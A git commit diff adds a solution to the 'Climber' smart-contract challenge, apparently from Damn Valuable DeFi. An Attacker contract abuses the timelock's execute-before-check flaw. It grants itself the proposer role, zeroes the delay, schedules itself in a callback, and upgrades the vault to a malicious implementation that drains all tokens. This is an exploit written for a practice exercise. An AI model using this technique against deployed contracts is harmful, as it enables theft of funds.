b0469fc5424940ef48ae97194ce0b61ef4a6c3e1
bentobox19.eth <bentobox19@protonmail.com>
2024-09-17 23:06:39 -0300

    Complete Climber

--- test/climber/Climber.t.sol
+++ test/climber/Climber.t.sol
@@ -8,6 +8,11 @@ import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 
+import {AccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";
+import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
+
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -85,7 +90,8 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        Attacker attacker = new Attacker(timelock, vault, token, recovery);
+        attacker.attack();
     }
 
     /**
@@ -95,4 +101,113 @@ contract ClimberChallenge is Test {
         assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
         assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
+}
+
+contract Attacker {
+    ClimberTimelock private timelock;
+    ClimberVault private vault;
+    DamnValuableToken private token;
+    address private recovery;
+
+    address private newImplementation;
+
+    constructor(ClimberTimelock _timelock, ClimberVault _vault, DamnValuableToken _token, address _recovery) {
+        timelock = _timelock;
+        vault = _vault;
+        token = _token;
+        recovery = _recovery;
+
+        newImplementation = address(new AttackerClimberVault());
+    }
+
+    function attack() external {
+        // ClimberTimelock::execute() allows arbitrary invocation by any caller.
+        //
+        // The function calls functionCallWithValue() on target contracts before
+        // verifying the operation's state through getOperationState(id).
+        //
+        // This misordering allows an attacker to execute arbitrary operations
+        // without the operation being marked as ready, potentially escalating
+        // privileges or executing unauthorized actions.
+
+        // Review the function getPayload() for a description of each task
+        (address[] memory targets, uint256[] memory values, bytes[] memory dataElements) = getPayload();
+        timelock.execute(targets, values, dataElements, 0x0);
+    }
+
+    // ClimberTimelock::execute will call it.
+    function invokeTimelockSchedule() external {
+        (address[] memory targets, uint256[] memory values, bytes[] memory dataElements) = getPayload();
+        timelock.schedule(targets, values, dataElements, 0x0);
+    }
+
+    function getPayload() private view returns (address[] memory, uint256[] memory, bytes[] memory) {
+        uint8 numberOfCalls = 4;
+        address[] memory targets = new address[](numberOfCalls);
+        uint256[] memory values = new uint256[](numberOfCalls);
+        bytes[] memory dataElements = new bytes[](numberOfCalls);
+        uint8 i; // This variable facilitates the ordering of tasks.
+
+        // We need to grant ourselves the PROPOSER_ROLE to be able to use
+        // schedule(). Also, if the operation is not scheduled, the execution
+        // will fail. As the caller of the function is the ClimberTimelock
+        // contract, we can just use grantRole().
+        i = 0;
+        targets[i] = address(timelock);
+        values[i] = 0;
+        dataElements[i] = abi.encodeWithSelector(
+            AccessControl.grantRole.selector, PROPOSER_ROLE, address(this)
+        );
+
+        // Next, we override the delay for execution readiness by setting the
+        // delay to 0. This modifies the operation's readyAtTimestamp to the
+        // current timestamp.
+        i = 1;
+        targets[i] = address(timelock);
+        values[i] = 0;
+        dataElements[i] = abi.encodeWithSelector(
+            ClimberTimelock.updateDelay.selector, 0
+        );
+
+        // Then, we schedule the task. Both execute and schedule use targets,
+        // values, dataElements, and salt as variables, and these values need
+        // to be equal. We cannot just pass a direct call to schedule() with
+        // these parameters (circular dependency). To solve that, we issue the
+        // call to a proxy function invokeTimelockSchedule() in our attacker
+        // contract, which uses this getPayload() function.
+        i = 2;
+        targets[i] = address(this);
+        values[i] = 0;
+        dataElements[i] = abi.encodeWithSelector(
+            this.invokeTimelockSchedule.selector
+        );
+
+        // Finally, we sweep the vault. We create a UUPSUpgradeable contract,
+        // whose initialize() function sends the vault contract's token funds
+        // to our recovery function, completing the challenge.
+        i = 3;
+        targets[i] = address(vault);
+        values[i] = 0;
+        dataElements[i] = abi.encodeWithSelector(
+            UUPSUpgradeable.upgradeToAndCall.selector,
+            newImplementation,
+            abi.encodeWithSelector(
+                AttackerClimberVault.initialize.selector, address(token),
+                recovery
+            )
+        );
+
+
+        return (targets, values, dataElements);
+    }
+}
+
+// Needs to inherit from UUPSUpgradeable to avoid ERC1967InvalidImplementation error.
+contract AttackerClimberVault is UUPSUpgradeable {
+    function initialize(address token, address recovery) external {
+        SafeTransferLib.safeTransfer(token, recovery, IERC20(token).balanceOf(address(this)));
+    }
+
+    // Comply with interface.
+    function _authorizeUpgrade(address newImplementation) internal override {}
 }
